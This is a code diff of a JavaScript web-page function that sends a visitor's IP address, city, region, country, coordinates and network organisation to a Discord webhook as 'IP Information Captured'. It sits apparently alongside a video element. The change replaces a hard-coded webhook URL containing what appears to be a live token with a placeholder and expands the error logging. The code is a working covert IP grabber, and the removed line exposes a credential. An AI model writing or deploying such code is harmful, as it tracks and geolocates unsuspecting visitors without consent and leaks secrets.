@@ -160,40 +160,43 @@
     }
 
     function sendToDiscord(data) {
-        const webhookUrl = "https://discord.com/api/webhooks/1322344664359239720/OP-GxUPNa6rkUfz52ovgWpFBd0aDhghLDaNpwuEc5XxaYJqahFqr4PwaDiKRaJYRFAg9"; // Replace with your actual webhook URL
-        const payload = {
-            embeds: [
-                {
-                    title: "IP Information Captured",
-                    fields: [
-                        { name: "IP Address", value: data.ip, inline: true },
-                        { name: "City", value: data.city, inline: true },
-                        { name: "Region", value: data.region, inline: true },
-                        { name: "Country", value: data.country, inline: true },
-                        { name: "Location", value: data.loc, inline: true },
-                        { name: "Organization", value: data.org, inline: true }
-                    ],
-                    color: 16711680, // Red color in decimal
-                    timestamp: new Date().toISOString()
-                }
-            ]
-        };
-
-        fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Data sent to Discord successfully.");
-            } else {
-                console.error("Error sending data to Discord.");
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual webhook URL
+    const payload = {
+        embeds: [
+            {
+                title: "IP Information Captured",
+                fields: [
+                    { name: "IP Address", value: data.ip, inline: true },
+                    { name: "City", value: data.city, inline: true },
+                    { name: "Region", value: data.region, inline: true },
+                    { name: "Country", value: data.country, inline: true },
+                    { name: "Location", value: data.loc, inline: true },
+                    { name: "Organization", value: data.org, inline: true }
+                ],
+                color: 16711680, // Red color in decimal
+                timestamp: new Date().toISOString()
             }
-        })
-        .catch(error => console.error("Error sending data to Discord:", error));
+        ]
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Data sent to Discord successfully.");
+        } else {
+            console.error(`Error sending data to Discord: ${response.status} ${response.statusText}`);
+            response.text().then(text => console.error("Response body:", text));
+        }
+    })
+    .catch(error => {
+        console.error("Error sending data to Discord:", error);
+    });
     }
 
     const video = document.getElementById("video");
